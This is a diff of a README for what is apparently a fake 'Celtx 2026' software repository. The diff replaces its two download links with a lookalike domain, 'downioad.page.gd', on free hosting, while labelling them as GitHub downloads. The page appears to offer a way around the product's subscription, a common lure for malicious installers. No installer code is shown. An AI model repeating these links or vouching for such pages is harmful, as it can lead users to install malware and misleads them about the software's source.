@@ -2,7 +2,7 @@
 
 Celtx 2026 Screenwriting Suite revolutionizes the way filmmakers and writers approach pre-production. This all-in-one platform combines powerful scriptwriting capabilities with comprehensive production planning tools, designed specifically for Windows 10 and Windows 11 users in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features of Celtx 2026
 
@@ -64,7 +64,7 @@ A5: Celtx 2026 may require a subscription for premium features. This repository 
 
 To get the latest version, use the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
